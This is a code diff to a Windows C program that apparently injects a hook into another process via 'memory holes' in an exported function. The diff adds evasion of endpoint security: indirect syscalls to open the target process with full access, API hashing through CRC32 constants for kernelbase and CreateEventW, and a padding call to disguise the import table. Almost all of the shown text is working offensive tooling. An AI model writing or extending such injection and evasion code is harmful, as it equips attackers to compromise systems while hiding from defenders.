@@ -1,10 +1,26 @@
 #include <stdio.h>
 #include <windows.h>
 #include <stdint.h>
+#include "Common.h"
+#include <shlobj.h>
+#include "Structs.h"
+
+#pragma comment (lib, "shell32.lib")
+
+NT_API	g_Nt = { 0 };
+NTSTATUS    STATUS = 0x00;
+
+CLIENT_ID ClientId = {0};
 
 void GenerateHook(int64_t originalInstruction);
 int64_t FindMemoryHole(IN HANDLE hProcess, IN void** exportedFunctionAddress, IN int size);
 
+
+VOID AddWin32uToIat() {
+
+	WCHAR szPath[MAX_PATH] = { 0 };
+	SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
+}
 
 void ConcatArrays(unsigned char* result, const unsigned char* arr1, size_t arr1Size, const unsigned char* arr2, size_t arr2Size) {
 	// Copy elements from the first array
@@ -63,9 +79,21 @@ int main(int argc, char** argv)
 	BOOL rez = FALSE;
 	int writtenBytes = 0;
 
+	OBJECT_ATTRIBUTES ObjectAttributes;
+	ClientId.UniqueThread = NULL;
+	ClientId.UniqueProcess = UlongToHandle(pid);
+
+	AddWin32uToIat();
+
+	// Initialize indirect syscalls structure
+	if (!InitIndirectSyscalls(&g_Nt)) {
+		return -1;
+	}
+
 	//Loading DLL into the process
 	printf("\n[*] Loading: %s\n", moduleName);
-	HMODULE hModule = GetModuleHandle(argv[1]);
+	//HMODULE hModule = GetModuleHandleH(argv[1]);
+	HMODULE hModule = GetModuleHandleH(kernelbasedll_CRC32);
 
 	if (hModule == NULL)
 	{
@@ -81,7 +109,10 @@ int main(int argc, char** argv)
 
 	//Getting the address of specific function of the DLL
 	printf("[*] Getting the address of %s\n", exportedFunction);
-	void* exportedFunctionAddress = GetProcAddress(hModule, exportedFunction);
+
+	//void* exportedFunctionAddress = GetProcAddressH(hModule, exportedFunction);
+
+	void* exportedFunctionAddress = GetProcAddressH(hModule, CreateEventW_CRC32);
 	if (exportedFunctionAddress == NULL)
 	{
 		printf("  [ERROR] Could not find %s in %s\n", exportedFunction, moduleName);
@@ -90,7 +121,21 @@ int main(int argc, char** argv)
 	printf("  [+] %s Address: 0x%p\n\n", exportedFunction, exportedFunctionAddress);
 
 
+	printf("[V] NtOpenProcess [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n", g_Nt.NtOpenProcess.dwSSn, g_Nt.NtOpenProcess.pSyscallInstAddress);
+	
+	// Opening a Process /w Syscall
+	HANDLE hProcess = NULL;
+	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
+	SET_SYSCALL(g_Nt.NtOpenProcess);
+	if (!NT_SUCCESS(STATUS = RunSyscall(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId))) {
+		printf("[!] NtOpenProcess Failed With Error: 0x%0.8X \n", STATUS);
+		return FALSE;
+	}
+
+	printf("  [+] Successfully opened process with pid %d\n\n", pid);
+		
 	// Opening a Process
+	/*
 	printf("[*] Trying to open process with pid: %d\n", pid);
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (hProcess == NULL)
@@ -99,6 +144,8 @@ int main(int argc, char** argv)
 		return -99;
 	}
 	printf("  [+] Successfully opened process with pid %d\n\n", pid);
+	*/
+
 
 	//Allocating memory holes
 	printf("[*] Trying to find memory holes\n");
